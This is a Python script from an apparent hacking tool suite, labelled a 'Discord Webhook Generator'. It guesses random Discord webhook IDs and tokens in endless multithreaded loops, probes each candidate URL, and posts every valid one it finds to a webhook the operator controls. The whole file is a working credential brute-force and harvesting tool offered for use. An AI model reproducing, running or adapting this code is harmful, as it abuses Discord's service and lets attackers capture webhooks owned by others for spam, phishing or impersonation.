# Copyright (c) 2026 v4lkyr0
# See LICENSE file for details

from Plugins.Utils import *
from Plugins.Config import *

try:
    import json
    import random
    import requests
    import string
    import threading
except Exception as e:
    MissingModule(e)

Title("Discord Webhook Generator")
Connection()

try:
    webhook = ChoiceWebhook()

    try:
        threads_number = int(input(f"{INPUT} Threads Number {red}->{reset} ").strip())
    except:
        ErrorNumber()

    print(f"{LOADING} Generating Webhook..", reset)

    def SendWebhook(embed_content):
        payload = {
            'embeds': [embed_content],
            'username': username_webhook,
            'avatar_url': avatar_webhook
        }
        headers = {'Content-Type': 'application/json'}

        requests.post(webhook, data=json.dumps(payload), headers=headers)

    def WebhookCheck():
        WEBHOOK_ID_LENGTH = 19
        WEBHOOK_TOKEN_LENGTH = 68
        first_part = ''.join([str(random.randint(0, 9)) for _ in range(WEBHOOK_ID_LENGTH)])
        second_part = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(WEBHOOK_TOKEN_LENGTH))
        test_code = f"{first_part}/{second_part}"
        test_webhook = f"https://discord.com/api/webhooks/{test_code}"

        try:
            response = requests.head(test_webhook)
            if response.status_code == 200:
                embed_content = {
                    "title": "Webhook found!",
                    "description": f"**Webhook:**\n```{test_webhook}```",
                    "color": color_embed,
                    "footer": {"text": username_webhook, "icon_url": avatar_webhook}
                }
                SendWebhook(embed_content)
                print(f"{SUCCESS} Status:{red} Valid   {white}| Webhook:{red} {test_code}", reset)
            else:
                print(f"{ERROR} Status:{red} Invalid {white}| Webhook:{red} {test_code}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Webhook:{red} {test_code}", reset)

    def Request():
        threads = []
        try:
            for _ in range(threads_number):
                t = threading.Thread(target=WebhookCheck)
                threads.append(t)
                t.start()
        except:
            ErrorNumber()

        for thread in threads:
            thread.join()

    while True:
        Request()

except Exception as e:
    Error(e)